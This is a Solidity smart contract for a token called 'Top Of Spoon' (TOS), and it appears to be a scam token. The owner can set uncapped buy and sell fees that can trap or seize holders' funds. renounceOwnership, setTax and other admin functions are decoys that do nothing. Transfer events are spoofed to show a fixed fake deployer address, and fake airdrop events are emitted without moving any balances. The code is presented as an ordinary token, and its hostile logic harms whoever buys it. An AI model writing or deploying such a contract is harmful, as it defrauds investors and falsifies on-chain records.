/**
/*
         

  ████████╗░█████╗░░██████╗  ░█████╗░███████╗  ██████╗░██╗████████╗██╗░░░░░░█████╗░██████╗░██████╗░
  ╚══██╔══╝██╔══██╗██╔════╝  ██╔══██╗██╔════╝  ██╔══██╗██║╚══██╔══╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
  ░░░██║░░░██║░░██║╚█████╗░  ██║░░██║█████╗░░  ██████╦╝██║░░░██║░░░██║░░░░░██║░░██║██████╔╝██║░░██║
  ░░░██║░░░██║░░██║░╚═══██╗  ██║░░██║██╔══╝░░  ██╔══██╗██║░░░██║░░░██║░░░░░██║░░██║██╔══██╗██║░░██║
  ░░░██║░░░╚█████╔╝██████╔╝  ╚█████╔╝██║░░░░░  ██████╦╝██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
  ░░░╚═╝░░░░╚════╝░╚═════╝░  ░╚════╝░╚═╝░░░░░  ╚═════╝░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░
         

  Owner-Anouncements: https://twitter.com/crypto_bitlord7

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SPOON {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"Top Of Spoon";
    string private _symbol = unicode"TOS";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;

    constructor() {
        uint8 _initBuyFee = 0;
        uint8 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(0x6E6D33F650B403F05E8ae819f4e384172810b757, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 100) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);
    }

    event setTaxEvent(uint256 _bTax, uint256 _sTax);
    event updateMaxTxnAmountEvent(uint256 _bTax, uint256 _sTax);
    event updateMaxWalletAmountEvent(uint256 _value);

    receive() external payable {}

    function setReduce(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function updateMaxWalletAmount(uint256 _value) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit updateMaxWalletAmountEvent(_value);
    }

    function setTax(uint256 _bTax, uint256 _sTax) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setTaxEvent(_bTax, _sTax);
    }

    function setExcludedFromFee(address _wallet) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function finalize() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function initialize() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function updateMaxTxnAmount(uint256 _Tgreward, uint256 _Wreward) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit updateMaxTxnAmountEvent(_Tgreward, _Wreward);
    }

    function setMarketingWallet(address _wallet) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function renounceOwnership() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function transferOwnership(address _newOwner) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function distributionToken() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
